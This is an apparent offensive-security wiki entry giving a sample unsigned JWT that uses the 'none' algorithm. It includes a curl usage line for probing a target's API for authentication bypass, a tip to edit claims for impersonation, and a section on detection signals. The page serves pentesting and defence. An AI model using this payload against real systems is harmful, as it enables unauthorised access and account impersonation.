---
type: code
language: text
verified: true
platforms:
  - Web
tags:
  - jwt
  - token
  - sample
validated: true
---

# sample-jwt-null-signature-token

## Code

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
```

## Description

This is a sample unsigned JWT token using the 'none' algorithm in the header. It has no signature (ends with a dot) and can be used to test if a server accepts null signatures for authentication bypass. The payload includes basic claims; customize for specific impersonation.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | Fixed sample; edit payload claims manually before use | N/A |

## Usage

Copy the token and use it in HTTP requests as 'Authorization: Bearer <token>'. For example, in curl: curl -H "Authorization: Bearer eyJhbGciOiJub25lIiw..." https://target/api. Ideal for initial vulnerability probing in red team engagements or pentests.

## Detection

- Log analysis for tokens with 'alg' = 'none' or empty signature part
- WAF rules blocking unsigned JWTs or anomalous claim values (e.g., unexpected 'admin': true)
- JWT library logs showing acceptance of 'none' alg (indicates misconfig)
- Network monitoring for rapid token submissions from unknown sources

## Related

- [[procedures/jwt-null-signature-authentication-bypass]]
- [[tools/jwt_tool]]
